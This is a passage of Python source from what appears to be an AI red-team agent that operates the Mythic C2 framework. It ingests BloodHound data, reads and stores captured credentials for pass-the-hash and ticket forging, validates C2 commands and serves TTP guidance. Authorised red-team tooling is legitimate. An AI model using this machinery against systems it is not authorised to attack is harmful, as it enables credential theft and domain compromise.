            }, sort_keys=True)
        # 3. Resolve the BloodHound MCP's file_upload + domain_info tools (generic; no Mythic knowledge).
        upload_tool = None
        info_tool = None
        try:
            from ai.mcp import MCPManager
            for server in MCPManager.get_connected_servers():
                if not MCPManager.is_bloodhound_server(server):
                    continue
                for tool in MCPManager.get_tools_by_server(server):
                    n = getattr(tool, "name", "")
                    if n == "file_upload":
                        upload_tool = tool
                    elif n == "domain_info":
                        info_tool = tool
        except Exception as e:
            return json.dumps({"status": "error", "error": f"Could not access the BloodHound MCP: {e}"}, sort_keys=True)
        if upload_tool is None:
            return json.dumps({"status": "error", "file_uuid": file_uuid,
                               "error": "BloodHound MCP not connected (or its file_upload tool is unavailable). Connect it with `bloodhound-connect` first."}, sort_keys=True)
        # 4. Upload the bytes DIRECTLY to BloodHound, programmatically (bytes never enter the LLM context).
        import base64 as _b64
        b64 = _b64.b64encode(file_content).decode("ascii")
        logger.info(f"🩸 ingest_collection: in-memory upload of {safe_name} ({len(file_content)} bytes) to BloodHound (file_uuid={file_uuid}, {resolved_by})")
        try:
            result = await upload_tool.ainvoke({"info_type": "upload_bytes", "file_name": safe_name, "file_bytes_base64": b64})
        except Exception as e:
            return json.dumps({"status": "error", "file_uuid": file_uuid, "filename": safe_name,
                               "error": f"BloodHound upload_bytes failed: {e}"}, sort_keys=True)
        # 5. VERIFY via the AUTHORITATIVE ingest-job status (BloodHound ingest is ASYNCHRONOUS — observed
        #    ~46s for a full collection — so a single immediate check yields a FALSE "empty graph"). Poll
        #    file_upload(info_type="status", job_id=...) until status_message == "Complete" (or a failure /
        #    timeout). This is definitive: it distinguishes Complete vs still-ingesting vs Failed, regardless
        #    of whether the domain count changed (handles re-ingest of an already-populated collection).
        up = _mcp_response_data(result)
        job_id_bh = up.get("job_id") if isinstance(up, dict) else None
        status_msg = None
        if job_id_bh is not None:
            for _ in range(20):  # up to ~120s of async-ingest wait
                await asyncio.sleep(6)
                try:
                    st = _mcp_response_data(
                        await upload_tool.ainvoke({"info_type": "status", "job_id": job_id_bh})
                    )
                except Exception:
                    st = None
                status_msg = st.get("status_message") if isinstance(st, dict) else None
                if status_msg == "Complete":
                    break
                if status_msg in ("Failed", "Canceled", "Partially Complete"):
                    break
        verified = (status_msg == "Complete")
        failed = status_msg in ("Failed", "Canceled")
        status_out = "ingested" if verified else ("ingest_failed" if failed else "uploaded_pending_ingest")
        covered_domains = (
            await _bloodhound_collected_domains(info_tool)
            if verified
            else []
        )
        collection_proof = (
            self._runtime_bloodhound_proof_envelope(
                "bloodhound_ingest:completed",
                datetime.now(timezone.utc).isoformat(),
                ingest_job_id=job_id_bh,
                ingest_status=status_msg or "",
                source_artifact_id=file_uuid,
                source_artifact_sha256=content_hash,
                callback_id=callback_display_id,
                task_id=source_task_id,
                terminal_status="completed",
                command=source_command,
                metadata={"filename": safe_name},
            )
            if verified
            else {}
        )
        if collection_proof:
            self._last_bloodhound_ingest_proof_envelope = dict(collection_proof)
        # Loop-breaker: once the graph is populated the forward planner can name the next hop. Refresh the
        # cached graph facts so the per-turn injection surfaces NEXT GROUNDED ACTIONS (graph ACL edges →
        # available hops) and the operator advances instead of re-collecting. Fire on EVERY ingest (not
        # just verified): ingest is async, so a collection that reads "pending" here is often Complete
        # seconds later — the refresh is non-clobbering (keeps prior facts if this cypher returns empty).
        try:
            await self._refresh_graph_facts_if_stale(
                datetime.now(timezone.utc).isoformat(),
                force=True,
                proof_envelope=collection_proof,
            )
        except Exception:
            pass
        # Record the collect-graph effect (graph-built at this access level) so re-collection is gated, and
        # clear the in-flight marker. Keyed by the resolving callback's foothold. Best-effort, fail-open.
        try:
            await self._record_graph_built(
                callback_display_id,
                verified,
                covered_domains=covered_domains,
                collection_scope_domain=collection_scope_domain,
                proof_envelope=collection_proof,
            )
        except Exception:
            pass
        if verified:
            self._record_collection_ingested(content_hash, job_id_bh)  # idempotency: don't re-ingest this artifact
            self._complete_operator_collection_request()
        return json.dumps({"status": status_out, "file_uuid": file_uuid, "filename": safe_name,
                           "bytes": len(file_content), "resolved_by": resolved_by,
                           "source_callback_display_id": callback_display_id,
                           "bloodhound_job_id": job_id_bh, "job_status": status_msg,
                           "graph_verified": verified,
                           "covered_domains": covered_domains,
                           "bloodhound_response": str(result)[:300],
                           "next_action": (
                               f"BloodHound ingest job {job_id_bh} is COMPLETE — the graph is populated. Hand off "
                               "to the BloodHound agent for attack-path analysis." if verified else
                               (f"BloodHound ingest job {job_id_bh} ended '{status_msg}' — ingest FAILED. Do NOT "
                                "re-collect; report the blocker and investigate the collection/BloodHound." if failed else
                                f"Upload accepted (BloodHound job {job_id_bh}); status '{status_msg}' after ~120s — "
                                "still ingesting or status unavailable. Do NOT re-collect or re-upload. Hand off to "
                                f"the BloodHound agent to poll file_upload(info_type='status', job_id={job_id_bh}) "
                                "until Complete, then analyze."))}, sort_keys=True)

    async def get_operations(self) -> str:
        """Get a list of all operations in Mythic."""
        # HITL: free
        if self.client is None:
            raise Exception("MythicAPIClient not initialized. Call login() first.")
        logger.debug("🛠️ Calling get_operations tool")
        resp = await mythic.get_operations(mythic=self.client)
        return json.dumps(resp, sort_keys=True)

    async def read_credentials(self, realm: str = "", account: str = "") -> str:
        """Read credentials from Mythic's credential store for the current operation.

        Many payload types (e.g. Apollo) auto-add captured credentials to this store, but not all do —
        read it BEFORE forging tickets / pass-the-hash to reuse a secret the operation already holds.
        Optionally filter by `realm` (domain) and/or `account` (username) — case-insensitive substring.
        Returns account, realm, type, the secret value, and any comment. Read-only.
        """
        # HITL: free (read-only)
        if self.client is None:
            raise Exception("MythicAPIClient not initialized. Call login() first.")
        logger.debug(f"🛠️ Calling read_credentials tool (realm={realm!r}, account={account!r})")
        # Shared short-TTL cache (read_credentials was hit 24× in one solve; also powers the gate's
        # durable-hop corroboration probe) — avoids re-querying Mythic on every call.
        creds = await self._fetch_credentials_cached(datetime.now(timezone.utc).isoformat())
        r_cf, a_cf = (realm or "").strip().casefold(), (account or "").strip().casefold()
        if r_cf:
            creds = [c for c in creds if r_cf in str(c.get("realm") or "").casefold()]
        if a_cf:
            creds = [c for c in creds if a_cf in str(c.get("account") or "").casefold()]
        if not creds:
            return "No credentials in the Mythic store (matching the given filters)."
        lines = [f"{len(creds)} credential(s) in the Mythic store:"]
        for c in creds:
            line = (f"- account={c.get('account') or '-'} realm={c.get('realm') or '-'} "
                    f"type={c.get('type') or '-'} credential={c.get('credential_text') or '-'}")
            if c.get("comment"):
                line += f" comment={c.get('comment')}"
            lines.append(line)
        return "\n".join(lines)

    async def add_credential(self, credential: str, account: str = "", realm: str = "",
                             credential_type: str = "plaintext", comment: str = "") -> str:
        """Add a credential to Mythic's credential store for the current operation.

        Use after recovering a secret (a dumped hash, a cracked/known password, a Kerberos key) so it is
        recorded where the whole operation can see and reuse it — many payload types do NOT auto-add.
        `credential_type` is one of: plaintext, hash, key, ticket, certificate, token, cookie, hex
        (default plaintext). `account` = username, `realm` = domain. State-changing (HITL-gated).
        """
        # HITL: guarded (mutates the Mythic credential store)
        if self.client is None:
            raise Exception("MythicAPIClient not initialized. Call login() first.")
        if not (credential or "").strip():
            return "add_credential requires a non-empty `credential` value."
        logger.debug(f"🛠️ Calling add_credential tool (account={account!r}, realm={realm!r}, type={credential_type!r})")
        try:
            result = await mythic.create_credential(
                self.client, credential=credential, account=account, realm=realm,
                comment=comment, credential_type=(credential_type or "plaintext"),
            )
        except Exception as e:
            return f"Failed to add credential: {e}"
        if (result or {}).get("status") == "success":
            return (f"Added credential to the Mythic store (id={result.get('id')}): "
                    f"account={account or '-'} realm={realm or '-'} type={credential_type or 'plaintext'}.")
        return f"add_credential did not succeed: {result}"

    async def _resolve_payload_type(self, callback_display_id: int) -> str | None:
        """Best-effort lookup of a callback's Mythic payload type name (e.g. 'apollo').

        Returns None if it can't be resolved; TTP guidance still works without it,
        just without the agent-specific execution join.
        """
        if self.client is None:
            return None
        try:
            callbacks = await mythic.get_all_active_callbacks(self.client)
            for cb in callbacks or []:
                if cb.get("display_id") == callback_display_id or cb.get("id") == callback_display_id:
                    payload = cb.get("payload")
                    if isinstance(payload, dict):
                        ptype = payload.get("payloadtype")
                        if isinstance(ptype, dict) and ptype.get("name"):
                            return ptype["name"]
                    return cb.get("payload_type") or cb.get("payloadtype")
        except Exception as e:
            logger.debug(f"Could not resolve payload type for callback {callback_display_id}: {e}")
        return None

    async def _authenticate_live_command(self, command: str, callback_display_id) -> dict:
        """Return whether `command` is present on the callback's live payload command surface.

        A direct schema hit is enough to authenticate a valid command without fetching the whole surface.
        When that misses, enumerate the live surface once so "unknown command" is distinguishable from
        "schema lookup unavailable".
        """
        command_name = self._capability_text(command)
        if not command_name:
            return {"status": "unknown", "command": "", "payload_type": ""}
        payload_type, command_surface, reason = await self._fetch_live_command_surface(callback_display_id)
        if command_surface is not None:
            try:
                from . import mechanic_repair
            except ImportError:
                import mechanic_repair
            canonical = mechanic_repair.canonical_command_name(command_surface, command_name)
            if canonical:
                return {
                    "status": "available",
                    "command": canonical,
                    "schema": mechanic_repair.command_schema(command_surface, canonical) or [],
                    "payload_type": payload_type or "",
                    "command_surface": command_surface,
                }
            return {
                "status": "missing",
                "command": command_name,
                "payload_type": payload_type or "",
                "command_surface": command_surface,
                "reason": self._missing_live_command_message(command_name, payload_type, callback_display_id),
            }
        try:
            schema = await self._fetch_command_schema(command_name, callback_display_id)
            if schema is not None:
                fallback_payload_type = await self._resolve_payload_type(callback_display_id)
                return {
                    "status": "available",
                    "command": command_name,
                    "schema": schema,
                    "payload_type": fallback_payload_type or "",
                }
        except Exception:
            pass

        return {
            "status": "unknown",
            "command": command_name,
            "payload_type": payload_type or "",
            "reason": reason,
        }

    async def _fetch_live_command_surface(self, callback_display_id) -> tuple[str, list[dict] | None, str]:
        """Fetch the callback-loaded command surface, falling back to payload commands when needed."""
        payload_type = ""
        try:
            callback_key = str(callback_display_id)
            cached_callback = getattr(self, "_callback_command_surface_cache", {}).get(callback_key)
            if isinstance(cached_callback, tuple) and len(cached_callback) == 2:
                cached_payload, cached_surface = cached_callback
                if isinstance(cached_surface, list):
                    return self._capability_text(cached_payload), cached_surface, ""
            if self.client is not None:
                callback_query = f"""
                    query CallbackLoadedCommandSurface {{
                      callback(where: {{display_id: {{_eq: {int(callback_display_id)}}}}}) {{
                        payload {{ payloadtype {{ name }} }}
                        loadedcommands {{
                          command {{
                            cmd
                            commandparameters {{
                              name cli_name type description default_value choices parameter_group_name required
                            }}
                            description
                            help_cmd
                            needs_admin
                          }}
                        }}
                      }}
                    }}
                """
                try:
                    callback_result = await mythic.execute_custom_query(self.client, callback_query)
                    callbacks = callback_result.get("callback") if isinstance(callback_result, dict) else None
                    if isinstance(callbacks, list) and callbacks:
                        callback = callbacks[0] if isinstance(callbacks[0], dict) else {}
                        payload = callback.get("payload") if isinstance(callback, dict) else {}
                        payloadtype = payload.get("payloadtype") if isinstance(payload, dict) else {}
                        payload_type = self._capability_text(
                            payloadtype.get("name") if isinstance(payloadtype, dict) else ""
                        )
                        loaded = callback.get("loadedcommands") if isinstance(callback, dict) else []
                        surface = [
                            row.get("command")
                            for row in list(loaded or [])
                            if isinstance(row, dict) and isinstance(row.get("command"), dict)
                        ]
                        self._callback_command_surface_cache[callback_key] = (payload_type, surface)
                        return payload_type, surface, ""
                except Exception:
                    pass
            payload_type = self._capability_text(await self._resolve_payload_type(callback_display_id))
            if not payload_type:
                return "", None, "callback payload type could not be resolved"
            cached = getattr(self, "_command_schema_cache", {}).get(payload_type)
            if isinstance(cached, list):
                return payload_type, cached, ""
            if self.client is None:
                return payload_type, None, "Mythic client is not initialized"
            attr = """
            cmd
            commandparameters {
            cli_name
            name
            type
            description
            default_value
            choices
            parameter_group_name
            required
            }
            description
            help_cmd
            needs_admin
            """
            results = await mythic.get_all_commands_for_payloadtype(self.client, payload_type, attr)
            if not isinstance(results, list):
                return payload_type, None, "live payload command enumeration returned no command list"
            self._command_schema_cache[payload_type] = results
            if not hasattr(self, "_cmd_schema_cache"):
                self._cmd_schema_cache = {}
            for item in results:
                if not isinstance(item, dict):
                    continue
                name = self._capability_text(item.get("cmd"))
                if name:
                    self._cmd_schema_cache[(payload_type, name)] = list(item.get("commandparameters") or [])
            return payload_type, results, ""
        except Exception as exc:
            return payload_type, None, f"live payload command enumeration failed: {exc}"

    def _missing_live_command_message(self, command: str, payload_type: str | None, callback_display_id) -> str:
        payload = self._capability_text(payload_type) or "unknown"
        return (
            f"Construction failure: command '{self._capability_text(command)}' is not available on live "
            f"payload '{payload}' for callback {callback_display_id}; do not issue a command from another "
            "payload schema."
        )

    @staticmethod
    def _credential_schema_parameter_names(param_schema) -> set[str]:
        names: set[str] = set()
        for param in param_schema or []:
            if not isinstance(param, dict):
                continue
            if str(param.get("type") or "").casefold() not in {"credential", "credentialjson"}:
                continue
            for key in ("name", "cli_name"):
                value = str(param.get(key) or "").strip()
                if value:
                    names.add(value)
        return names

    async def _resolve_mythic_credential_reference(self, value, *, force_refresh: bool = False) -> str:
        text = self._capability_text(value).strip() if not isinstance(value, dict) else ""
        if text:
            match = re.fullmatch(r"@cred(?::|\()?(\d+)\)?", text, flags=re.I)
            if match:
                return f"@cred:{match.group(1)}"
            if text.isdigit():
                return f"@cred:{text}"
            return ""
        if not isinstance(value, dict):
            return ""

        credential_id = self._capability_text(
            value.get("id")
            or value.get("credential_id")
            or value.get("mythic_credential_id")
        ).strip()
        account = self._capability_text(value.get("account") or value.get("username") or value.get("user")).strip()
        realm = self._capability_text(value.get("realm") or value.get("domain")).strip()
        credential = self._capability_text(
            value.get("credential") or value.get("credential_text") or value.get("secret")
        ).strip()
        credential_type = self._capability_text(value.get("type") or value.get("credential_type") or "plaintext").strip()
        if not account or not realm or not credential:
            return f"@cred:{credential_id}" if credential_id.isdigit() else ""

        identity = (
            self._canonical_credential_account(account),
            realm.casefold(),
            credential,
            (credential_type or "plaintext").casefold(),
        )
        async with self._credential_reference_lock:
            existing = self._credential_reference_bindings.get(identity)
            if existing and not force_refresh:
                return existing

            if force_refresh:
                self._cred_cache = None
                self._cred_cache_ts = None
            rows = await self._fetch_credentials_cached(datetime.now(timezone.utc).isoformat())

            def row_matches(row: dict) -> bool:
                if self._canonical_credential_account(row.get("account")) != identity[0]:
                    return False
                if self._capability_text(row.get("realm")).casefold() != identity[1]:
                    return False
                if self._capability_text(row.get("credential_text")) != identity[2]:
                    return False
                row_type = self._capability_text(row.get("type")).casefold()
                return not row_type or row_type == identity[3]

            if credential_id.isdigit():
                for row in rows or []:
                    if self._capability_text(row.get("id")).strip() != credential_id:
                        continue
                    if row_matches(row):
                        reference = f"@cred:{credential_id}"
                        self._credential_reference_bindings[identity] = reference
                        return reference
                    break

            for row in rows or []:
                if not row_matches(row):
                    continue
                row_id = row.get("id")
                if row_id is not None:
                    reference = f"@cred:{row_id}"
                    self._credential_reference_bindings[identity] = reference
                    return reference

            # A just-created credential can be taskable before it appears in a subsequent store query.
            # Preserve that known binding rather than creating a duplicate during repair.
            if existing:
                return existing

            if self.client is None:
                return ""
            try:
                created = await mythic.create_credential(
                    self.client,
                    credential=credential,
                    account=account,
                    realm=realm,
                    comment="Sage schema-bound credential reference",
                    credential_type=credential_type or "plaintext",
                )
            except Exception:
                created = {}
            created_id = created.get("id") if isinstance(created, dict) else None
            if created_id is None:
                return ""
            reference = f"@cred:{created_id}"
            self._credential_reference_bindings[identity] = reference
            if self._cred_cache is not None:
                self._cred_cache.insert(0, {
                    "id": created_id,
                    "account": account,
                    "realm": realm,
                    "type": credential_type or "plaintext",
                    "credential_text": credential,
                    "comment": "Sage schema-bound credential reference",
                })
                self._cred_cache_ts = datetime.now(timezone.utc).isoformat()
            return reference

    def _register_bound_command_parameters(self, command: str, original, bound) -> None:
        if original == bound:
            return
        original_key = _capability_command_key(command, original)
        bound_key = _capability_command_key(command, bound)
        try:
            self._bound_failure_parameter_signatures[bound_key] = (
                json.dumps(original, sort_keys=True)
                if isinstance(original, (dict, list))
                else str(original)
            )
        except Exception:
            self._bound_failure_parameter_signatures[bound_key] = str(original)
        context = self._deterministic_capability_command_contexts.get(original_key)
        if isinstance(context, dict):
            self._deterministic_capability_command_contexts[bound_key] = context
        if _normalize_command_name(command) != "make_token":
            return
        for key in ("Credential", "credential"):
            credential = original.get(key) if isinstance(original, dict) else None
            if not isinstance(credential, dict):
                continue
            account = self._capability_text(
                credential.get("account") or credential.get("username") or credential.get("user")
            ).strip()
            realm = self._capability_text(
                credential.get("realm") or credential.get("domain")
            ).strip()
            if account or realm:
                self._bound_credential_contexts[bound_key] = (account, realm)
            break

    async def _bind_mythic_credential_parameters(
        self,
        command: str,
        parameters,
        callback_display_id,
        *,
        param_schema=None,
        force_refresh: bool = False,
    ):
        if not isinstance(parameters, dict) or not parameters:
            return parameters
        schema = param_schema
        if schema is None:
            schema = await self._fetch_command_schema(command, callback_display_id)
        credential_names = self._credential_schema_parameter_names(schema)
        if not credential_names:
            return parameters

        bound = dict(parameters)
        changed = False
        for key in list(bound):
            if key not in credential_names:
                continue
            reference = await self._resolve_mythic_credential_reference(
                bound[key],
                force_refresh=force_refresh,
            )
            if reference and reference != bound[key]:
                bound[key] = reference
                changed = True
        if changed:
            self._register_bound_command_parameters(command, parameters, bound)
            logger.info(
                "🔐 credential-bind command=%s callback=%s fields=%s",
                command,
                callback_display_id,
                sorted(key for key in bound if key in credential_names),
            )
        return bound

    @staticmethod
    def _is_mythic_credential_reference_rejection(value) -> bool:
        text = str(value or "").casefold()
        return "cred parameters require @cred task references" in text

    async def _fetch_command_schema(self, command, callback_display_id):
        """Resolve the parameter-group schema for `command` on the callback's payload type.

        Single in-module schema source shared by the resolver pre-flight and
        `_validate_command_parameters`. Reuses the same `command(...) { commandparameters {...} }`
        query that backs `get_all_commands_for_payloadtype`, lazily populating `self._cmd_schema_cache`
        keyed by (payload_type, command). Returns the list of param dicts, or None when the schema
        cannot be fetched (no client / no payload type / no schema / query error) so callers FAIL OPEN
        and fall through to today's behavior byte-identically. Never raises."""
        try:
            if self.client is None:
                return None
            payload_type = await self._resolve_payload_type(callback_display_id)
            if not payload_type:
                return None
            if not hasattr(self, "_cmd_schema_cache"):
                self._cmd_schema_cache = {}

            cache_key = (payload_type, command)
            if cache_key not in self._cmd_schema_cache:
                query = f"""
                    query CmdParamSchema {{
                      command(where: {{payloadtype: {{name: {{_eq: "{payload_type}"}}}}, cmd: {{_eq: "{command}"}}}}) {{
                        cmd
                        commandparameters {{ name cli_name type parameter_group_name required choices default_value }}
                      }}
                    }}
                """
                try:
                    result = await mythic.execute_custom_query(self.client, query)
                    commands = result.get("command") if isinstance(result, dict) else None
                    if not commands:
                        self._cmd_schema_cache[cache_key] = None
                    else:
                        self._cmd_schema_cache[cache_key] = commands[0].get("commandparameters")
                except Exception:
                    self._cmd_schema_cache[cache_key] = None

            return self._cmd_schema_cache.get(cache_key)
        except Exception:
            return None

    async def _validate_command_parameters(self, command, parameters, callback_display_id):
        """Pre-flight: validate a dict of params against the command's parameter-group schema.
        Returns None when OK (or when validation cannot be performed -> FAIL OPEN), else an
        actionable correction string the agent can act on without a wasted Mythic round-trip."""
        try:
            if not isinstance(parameters, dict) or not parameters:
                logger.info(f"🛡️ ARGVAL failed_open command={command} reason=not_a_dict")
                return None
            if self.client is None:
                logger.info(f"🛡️ ARGVAL failed_open command={command} reason=no_client")
                return None

            # payload_type is referenced only in the ARGVAL log lines below; resolve it ONCE here so
            # those f-strings never raise NameError. A missing binding made every validation path throw
            # and fail OPEN — silently disabling all parameter validation.
            payload_type = await self._resolve_payload_type(callback_display_id)

            param_list = await self._fetch_command_schema(command, callback_display_id)
            if not param_list:
                logger.info(f"🛡️ ARGVAL failed_open command={command} reason=no_schema")
                return None

            groups = {}
            valid_names = set()
            valid_cli = set()
            for param in param_list:
                if not isinstance(param, dict):
                    continue
                group_name = param.get("parameter_group_name") or "Default"
                groups.setdefault(group_name, []).append(param)
                if param.get("name"):
                    valid_names.add(param.get("name"))
                if param.get("cli_name"):
                    valid_cli.add(param.get("cli_name"))

            if not groups:
                logger.info(f"🛡️ ARGVAL failed_open command={command} reason=no_schema")
                return None

            alias_hints = {
                "computer": "host",
                "remote_host": "host",
                "target": "host",
                "payload": "Payload",
                "service_name": "remote_service_name",
                "servicename": "remote_service_name",
            }
            supplied = set(parameters.keys())

            def _param_label(param: dict) -> str:
                label = str(param.get("name") or param.get("cli_name") or "")
                attrs = []
                if param.get("required"):
                    attrs.append("required")
                if param.get("type") and param.get("type") != "String":
                    attrs.append(str(param.get("type")))
                if attrs:
                    label += f"({', '.join(attrs)})"
                return label

            def _format_groups() -> str:
                return "; ".join(
                    f"group '{group_name}': {', '.join(_param_label(param) for param in params)}"
                    for group_name, params in groups.items()
                )

            unknown = supplied - valid_names - valid_cli
            if unknown:
                logger.info(f"🛡️ ARGVAL rejected mode=A command={command} payload_type={payload_type} unknown={sorted(unknown)}")
                unknown_list = sorted((str(key) for key in unknown), key=str.lower)
                hint_parts = []
                for key in unknown_list:
                    suggestion = alias_hints.get(key)
                    if suggestion:
                        hint_parts.append(f"'{key}' should likely be '{suggestion}'")
                hint_text = f" Suggested fixes: {'; '.join(hint_parts)}." if hint_parts else ""
                return (
                    f"Invalid parameters for command '{command}': unknown key(s): {', '.join(unknown_list)}."
                    f"{hint_text} Valid parameters are {_format_groups()}."
                )

            covering = []
            for group_name, params in groups.items():
                keys = set()
                for param in params:
                    if param.get("name"):
                        keys.add(param.get("name"))
                    if param.get("cli_name"):
                        keys.add(param.get("cli_name"))
                if supplied.issubset(keys):
                    covering.append(group_name)

            if not covering:
                logger.info(f"🛡️ ARGVAL rejected mode=B command={command} payload_type={payload_type}")
                guidance = ""
                if command in ("inline_assembly", "execute_assembly"):
                    guidance = (
                        " For a freshly-uploaded file use the 'New Assembly' group: "
                        "{assembly_file, assembly_arguments}; for an already-registered assembly use "
                        "the 'Default' group: {assembly_name, assembly_arguments} — never both."
                    )
                return (
                    f"Invalid parameter group mix for command '{command}'. Pick exactly ONE parameter group. "
                    f"Available groups: {_format_groups()}.{guidance}"
                )

            selected_group = covering[0]
            selected_params = groups[selected_group]
            missing = []
            for param in selected_params:
                if not param.get("required"):
                    continue
                name = param.get("name")
                cli_name = param.get("cli_name")
                if name not in supplied and (not cli_name or cli_name not in supplied):
                    missing.append(str(name or cli_name))
            if missing:
                logger.info(f"🛡️ ARGVAL rejected mode=required command={command} group={selected_group} missing={missing}")
                return f"parameter group '{selected_group}' requires: {', '.join(missing)}"

            for supplied_key in supplied:
                param = next(
                    (
                        item for item in selected_params
                        if item.get("name") == supplied_key or item.get("cli_name") == supplied_key
                    ),
                    None,
                )
                if not param or param.get("type") != "ChooseOne":
                    continue
                val = str(parameters[supplied_key])
                choices = param.get("choices")
                if isinstance(choices, list) and choices and val not in choices:
                    logger.info(f"🛡️ ARGVAL rejected mode=C command={command} param={param.get('name')}")
                    return (
                        f"Parameter '{param.get('name')}' for command '{command}' is a ChooseOne and must be "
                        f"one of: {', '.join(str(choice) for choice in choices)}"
                    )
                if (
                    not choices
                    and re.fullmatch(r"^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$", val)
                ):
                    logger.info(f"🛡️ ARGVAL rejected mode=C command={command} param={param.get('name')}")
                    return (
                        f"Parameter '{param.get('name')}' for command '{command}' is a ChooseOne whose value must be the "
                        f"selectable DISPLAY STRING (e.g. for a payload selector: \"<filename> - <description> - <uuid>\" as "
                        f"returned by get_all_payloads), NOT a bare UUID. You passed a bare UUID."
                    )
            logger.info(f"🛡️ ARGVAL validated command={command} payload_type={payload_type} group={selected_group}")
            return None
        except Exception as e:
            try:
                logger.info(f"🛡️ ARGVAL failed_open command={command} reason=exception:{e}")
            except Exception:
                pass
            return None

    async def get_ttp_guidance(
        self,
        goal: Annotated[str, "The tradecraft goal in plain language, e.g. 'enumerate the domain', 'dump LSASS', 'abuse a GPO', 'request an ADCS cert'."],
        callback_display_id: Annotated[int, "The callback_display_id of the agent you intend to run the tradecraft on. Used to tailor execution guidance to that Mythic agent."],
    ) -> str:
        """Match a plain-language goal to Sage's TTP library and return the tool's common_args/usage_examples + guidance, tailored to how the target callback's agent runs it. Consult this FIRST, before reaching for an offensive tool.

        Caveat: progressive disclosure — rely on common_args/usage_examples; call
        get_ttp_full_reference(slug) only for an uncommon flag or exact output format.
        """
        # HITL: free
        logger.debug(f"🛠️ Calling get_ttp_guidance tool (goal={goal!r}, callback={callback_display_id})")
        matches = ttp_library.match_goal(goal)
        if not matches:
            categories = ttp_library.list_categories()
            return json.dumps({
                "status": "no_match",
                "goal": goal,
                "available_categories": sorted(categories.keys()),
                "hint": "Call list_ttp_categories for the full catalog, or restate the goal using tradecraft terms.",
            }, sort_keys=True)

        slug, _score = matches[0]
        frontmatter, body = ttp_library.load_ttp(slug)
        payload_type = await self._resolve_payload_type(callback_display_id)
        agent_frontmatter, _ = ttp_library.load_mythic_agent(payload_type)
        if agent_frontmatter:
            execution = ttp_library.execution_hint(frontmatter, agent_frontmatter)
        elif payload_type:
            execution = (f"No capability file for Mythic agent '{payload_type}' under mythic_agents/. "
                         f"Use get_all_commands_for_payloadtype('{payload_type}') to discover its command surface.")
        else:
            execution = ("Could not resolve the callback's payload type. Use get_all_active_callbacks "
                         "then get_all_commands_for_payloadtype to map execution.")

        result = {
            "slug": slug,
            "alternatives": [s for s, _ in matches[1:]],
            "payload_type": payload_type,
            "frontmatter": frontmatter,
            "guidance": ttp_library.guidance_body(body),
            "execution_on_agent": execution,
            "full_reference_available": ttp_library._FULL_REFERENCE_HEADING in (body or ""),
            "next": "Use common_args + usage_examples first; call get_ttp_full_reference(slug) only for uncommon flags, output format, or version specifics.",
        }
        # Proactive capability recommendation: if this tradecraft pairs with an MCP that isn't
        # currently connected, surface a suggestion for the operator (they decide; never auto-connect).
        # Suppressed when the MCP is already connected, so it never nags.
        recommends = frontmatter.get("recommends_mcp") if isinstance(frontmatter, dict) else None
        if recommends:
            connected = None
            try:
                from ai.mcp import MCPManager
                servers = MCPManager.get_connected_servers() or []
                connected = any(str(recommends).lower() in str(s).lower() for s in servers)
            except Exception:
                connected = None  # best-effort; if we can't tell, still recommend
            if connected is not True:
                result["recommendation"] = {
                    "capability": recommends,
                    "connected": (bool(connected) if connected is not None else None),
                    "message": (
                        f"This tradecraft pairs with the '{recommends}' MCP, which is not currently connected. "
                        f"It would let Sage reason over the collected data as an attack graph (shortest paths, "
                        f"ADCS ESC, Cypher). Recommend it to the operator as a SUGGESTION — do not auto-connect. "
                        f"For bloodhound, call get_ttp_guidance('stand up bloodhound') for the standup + mcp-connect steps."
                    ),
                }
        # Anti-cycle guard: re-querying guidance for the same goal is not progress. If the agent has asked
        # for near-identical guidance repeatedly, it is stuck planning instead of executing — tell it to act.
        cycle_warning = self._record_and_check_guidance_cycle(goal)
        if cycle_warning:
            result["cycle_warning"] = cycle_warning
        return json.dumps(result, sort_keys=True)

    def _record_and_check_guidance_cycle(self, goal: str) -> str | None:
        """Track recent get_ttp_guidance goals; return an escalating nudge when the agent re-queries
        near-identical guidance instead of executing. In-memory per MythicTools; never raises."""
        try:
            stop = {"the", "and", "for", "with", "using", "over", "from", "into", "via", "then",
                    "that", "this", "use", "get", "run", "now", "please", "onto", "off"}

            def _words(g: str) -> set[str]:
                toks = "".join(c.lower() if c.isalnum() else " " for c in str(g)).split()
                return {w for w in toks if len(w) > 2 and w not in stop}

            current = _words(goal)
            if not current:
                return None
            # Containment (overlap / smaller set), not Jaccard: the observed loop re-phrased the same core
            # goal ("read LAPS password … context") with varying extra words, which dilutes Jaccard below a
            # useful threshold. Containment catches "same core, reworded".
            similar = 0
            for prior in self._ttp_guidance_goals:
                pw = _words(prior)
                smaller = min(len(current), len(pw))
                if smaller and len(current & pw) / smaller >= 0.6:
                    similar += 1
            self._ttp_guidance_goals.append(goal)
            if len(self._ttp_guidance_goals) > 12:
                self._ttp_guidance_goals = self._ttp_guidance_goals[-12:]
            if similar >= 2:  # this is the 3rd+ near-identical guidance request
                return (
                    f"You have requested near-identical guidance ~{similar + 1} times for this goal. "
                    "Re-querying guidance is NOT progress and is burning the step/time budget. STOP planning: "
                    "ISSUE the next concrete command now, or call handback_to_supervisor with a CONCRETE named "
                    "blocker (the specific capability/credential/context you lack). Do NOT call get_ttp_guidance "
                    "again for this goal."
                )
            return None
        except Exception:
            return None

    def _recon_reread_guard(self, tool: str, key) -> str | None:
        """Detect redundant recon re-reads within the current task epoch (no command issued since the last
        read of this target). Returns an escalating STOP-re-reading nudge after repeated identical calls,
        else None. The epoch resets on each issued command, so a legitimate post-action re-read is allowed."""
        try:
            k = (tool, str(key), self._recon_epoch)
            n = self._recon_call_log.get(k, 0) + 1
            self._recon_call_log[k] = n
            if len(self._recon_call_log) > 256:  # bound memory across a long solve
                self._recon_call_log = {kk: vv for kk, vv in self._recon_call_log.items() if kk[2] >= self._recon_epoch - 1}
            if n >= 3:  # 3rd+ identical read with no intervening command
                return (
                    f"⚠️ You have called {tool} for the same target {n}× with NO new command issued since — the "
                    "data is UNCHANGED. Re-reading recon is NOT progress and is burning the step budget. STOP "
                    "re-reading: ISSUE the next concrete command now, or handback_to_supervisor with a concrete "
                    "named blocker. Act on the data you already have."
                )
            return None
        except Exception:
            return None

    async def get_ttp_full_reference(
        self,
        slug: Annotated[str, "The TTP slug (filename without .md), e.g. 'sharphound', returned as 'slug' by get_ttp_guidance."],
    ) -> str:
        """Get the full '## Full Reference' section for a TTP (comprehensive args, output, versions).

        Call this only after get_ttp_guidance when its `common_args`/`usage_examples` don't cover
        the flag, output format, or version-specific behavior you need. This is the deep, expensive
